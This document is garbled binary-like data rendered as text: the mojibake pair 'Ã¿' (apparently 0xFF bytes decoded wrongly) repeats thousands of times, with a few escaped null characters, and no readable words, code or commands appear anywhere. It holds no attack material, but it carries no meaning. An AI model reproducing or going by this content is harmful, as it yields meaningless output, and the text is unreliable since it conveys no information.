Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã